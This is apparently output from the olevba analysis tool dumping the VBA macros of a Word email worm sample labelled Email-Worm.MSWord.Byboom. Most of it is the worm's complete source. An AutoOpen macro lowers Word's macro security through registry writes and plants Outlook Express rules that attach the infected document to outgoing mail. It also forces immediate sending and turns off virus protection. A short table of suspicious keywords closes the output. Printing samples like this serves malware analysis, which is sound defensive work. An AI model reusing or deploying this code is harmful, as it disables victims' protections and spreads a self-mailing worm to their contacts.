olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Byboom
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Byboom - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Email-Worm.MSWord.Byboom - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Written by BOOM!"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
'
'
' Written by BOOM!, HI ESET your NOD32 Anti-Virus is really GOOD, HI Grisoft IHate your AVG
'



Set WSHShell = CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Software\Microsoft\Office\7.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Software\Microsoft\Office\8.0\Word\Security\Level", 1, "REG_DWORD"



WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\Order", "000"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Name", "Default"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Enabled", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Version", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Actions\Order", "000"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Actions\000\Value", "C:\Security2002.doc"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Actions\000\Flags", 0, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Actions\000\Type", 5, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Actions\000\ValueType", 30, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Criteria\Order", "000"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Criteria\000\Flags", 0, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Criteria\000\Logic", 0, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Rules\Mail\000\Criteria\000\Type", 20, "REG_DWORD"


WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Mail\Check mail on Startup", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Mail\Send Mail Immediately", 1, "REG_DWORD"
WSHShell.RegWrite "HKCU\Identities\" + WSHShell.RegRead("HKCU\Identities\Last User ID") + "\Software\Microsoft\Outlook Express\5.0\Hangup After Spool", 0, "REG_DWORD"


WSHShell.RegWrite "HKLM\Software\Microsoft\Security2002", "worm made by BOOM"

  
ActiveDocument.SaveAs ("C:\Security2002.doc")
Options.VirusProtection = False




End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|RegRead             |May read registry keys                       |
+----------+--------------------+---------------------------------------------+

